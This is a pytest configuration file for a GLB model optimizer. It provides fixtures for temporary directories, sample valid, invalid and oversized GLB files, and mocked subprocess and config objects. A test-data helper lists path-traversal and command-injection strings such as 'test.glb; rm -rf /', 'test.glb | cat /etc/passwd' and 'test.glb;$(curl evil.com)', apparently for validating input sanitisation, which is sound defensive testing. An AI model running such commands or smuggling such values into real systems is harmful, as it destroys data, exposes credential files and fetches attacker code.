"""
Pytest configuration and shared fixtures for GLB Optimizer test suite
"""
import pytest
import tempfile
import os
import shutil
from pathlib import Path
from unittest.mock import MagicMock, patch
import struct

@pytest.fixture
def temp_dir():
    """Create a temporary directory for test files"""
    temp_path = tempfile.mkdtemp(prefix='test_glb_')
    yield temp_path
    shutil.rmtree(temp_path, ignore_errors=True)

@pytest.fixture
def uploads_dir(temp_dir):
    """Create uploads directory for testing"""
    uploads = Path(temp_dir) / 'uploads'
    uploads.mkdir(exist_ok=True)
    return str(uploads)

@pytest.fixture
def output_dir(temp_dir):
    """Create output directory for testing"""
    output = Path(temp_dir) / 'output'
    output.mkdir(exist_ok=True)
    return str(output)

@pytest.fixture
def minimal_glb_file(uploads_dir):
    """Create a minimal valid GLB file for testing"""
    json_data = b'{"asset":{"version":"2.0"},"scenes":[{"nodes":[0]}],"nodes":[{"mesh":0}],"meshes":[{"primitives":[{"attributes":{"POSITION":0},"indices":1}]}],"accessors":[{"bufferView":0,"componentType":5126,"count":3,"type":"VEC3"},{"bufferView":1,"componentType":5123,"count":3,"type":"SCALAR"}],"bufferViews":[{"buffer":0,"byteOffset":0,"byteLength":36},{"buffer":0,"byteOffset":36,"byteLength":6}],"buffers":[{"byteLength":44}]}'
    
    # Pad JSON to 4-byte boundary
    json_length = len(json_data)
    padding = (4 - (json_length % 4)) % 4
    json_data += b' ' * padding
    json_length = len(json_data)
    
    # Create binary data (simple triangle)
    binary_data = struct.pack('<9f3H', 
        0.0, 0.0, 0.0,  # vertex 1
        1.0, 0.0, 0.0,  # vertex 2
        0.5, 1.0, 0.0,  # vertex 3
        0, 1, 2         # indices
    )
    binary_length = len(binary_data)
    
    # Pad binary to 4-byte boundary
    binary_padding = (4 - (binary_length % 4)) % 4
    binary_data += b'\x00' * binary_padding
    binary_length = len(binary_data)
    
    total_size = 12 + 8 + json_length + 8 + binary_length
    
    filepath = Path(uploads_dir) / 'test_model.glb'
    with open(filepath, 'wb') as f:
        # GLB header
        f.write(b'glTF')  # magic
        f.write((2).to_bytes(4, 'little'))  # version
        f.write(total_size.to_bytes(4, 'little'))  # total length
        
        # JSON chunk
        f.write(json_length.to_bytes(4, 'little'))
        f.write(b'JSON')
        f.write(json_data)
        
        # Binary chunk
        f.write(binary_length.to_bytes(4, 'little'))
        f.write(b'BIN\x00')
        f.write(binary_data)
    
    return str(filepath)

@pytest.fixture
def invalid_glb_file(uploads_dir):
    """Create an invalid GLB file for testing"""
    filepath = Path(uploads_dir) / 'invalid.glb'
    with open(filepath, 'wb') as f:
        f.write(b'NOT_GLB_DATA')
    return str(filepath)

@pytest.fixture
def large_glb_file(uploads_dir):
    """Create a large GLB file for testing size limits"""
    # Create a 10MB file
    filepath = Path(uploads_dir) / 'large_model.glb'
    json_data = b'{"asset":{"version":"2.0"}}' + b' ' * (10 * 1024 * 1024 - 50)
    json_length = len(json_data)
    padding = (4 - (json_length % 4)) % 4
    json_data += b' ' * padding
    json_length = len(json_data)
    total_size = 12 + 8 + json_length
    
    with open(filepath, 'wb') as f:
        f.write(b'glTF')
        f.write((2).to_bytes(4, 'little'))
        f.write(total_size.to_bytes(4, 'little'))
        f.write(json_length.to_bytes(4, 'little'))
        f.write(b'JSON')
        f.write(json_data)
    
    return str(filepath)

@pytest.fixture
def mock_subprocess():
    """Mock subprocess.run for testing external tool calls"""
    with patch('optimizer.subprocess.run') as mock_run:
        # Default successful return
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout='',
            stderr='',
            args=[]
        )
        yield mock_run

@pytest.fixture
def mock_environment_variables():
    """Mock environment variables for testing"""
    test_env = {
        'GLB_MAX_FILE_SIZE_MB': '100',
        'GLB_SUBPROCESS_TIMEOUT': '300',
        'GLB_MAX_PARALLEL_WORKERS': '2',
        'GLB_PARALLEL_TIMEOUT': '120'
    }
    with patch.dict(os.environ, test_env, clear=False):
        yield test_env

@pytest.fixture
def optimizer_with_temp_dirs(uploads_dir, output_dir, mock_environment_variables):
    """Create GLBOptimizer instance with test directories"""
    from optimizer import GLBOptimizer
    
    # Patch the config to use test directories
    with patch('optimizer.OptimizationConfig.from_env') as mock_config:
        config = MagicMock()
        config.MAX_FILE_SIZE_MB = 100
        config.SUBPROCESS_TIMEOUT = 300
        config.MAX_PARALLEL_WORKERS = 2
        config.PARALLEL_TIMEOUT = 120
        config.get_quality_settings.return_value = {
            'description': 'High quality optimization',
            'meshopt_compression': True,
            'draco_compression': True,
            'texture_compression': True,
            'enable_ktx2': True
        }
        config.to_dict.return_value = {'test': 'config'}
        mock_config.return_value = config
        
        # Patch allowed directories to include test directories
        with patch('optimizer.GLBOptimizer._get_allowed_directories') as mock_dirs:
            mock_dirs.return_value = [uploads_dir, output_dir]
            
            optimizer = GLBOptimizer(quality_level='high')
            yield optimizer

class TestDataGenerator:
    """Helper class for generating test data"""
    
    @staticmethod
    def create_corrupted_glb(filepath, corruption_type='header'):
        """Create various types of corrupted GLB files"""
        if corruption_type == 'header':
            # Wrong magic number
            with open(filepath, 'wb') as f:
                f.write(b'BLTF')  # Wrong magic
                f.write((2).to_bytes(4, 'little'))
                f.write((100).to_bytes(4, 'little'))
        
        elif corruption_type == 'version':
            # Wrong version
            with open(filepath, 'wb') as f:
                f.write(b'glTF')
                f.write((99).to_bytes(4, 'little'))  # Wrong version
                f.write((100).to_bytes(4, 'little'))
        
        elif corruption_type == 'truncated':
            # Truncated file
            with open(filepath, 'wb') as f:
                f.write(b'glTF')
                f.write((2).to_bytes(4, 'little'))
                # File ends here (truncated)
    
    @staticmethod
    def create_path_traversal_attempts():
        """Generate various path traversal attack vectors"""
        return [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/shadow',
            'C:\\Windows\\System32\\config\\SAM',
            '../../../../usr/bin/python',
            '../uploads/../output/../etc/hosts',
            'uploads/../../etc/passwd',
            'test.glb; rm -rf /',
            'test.glb | cat /etc/passwd',
            'test.glb && whoami',
            'test.glb`whoami`',
            'test.glb$(whoami)',
            'test.glb;$(curl evil.com)',
        ]

@pytest.fixture
def test_data_generator():
    """Provide test data generator"""
    return TestDataGenerator()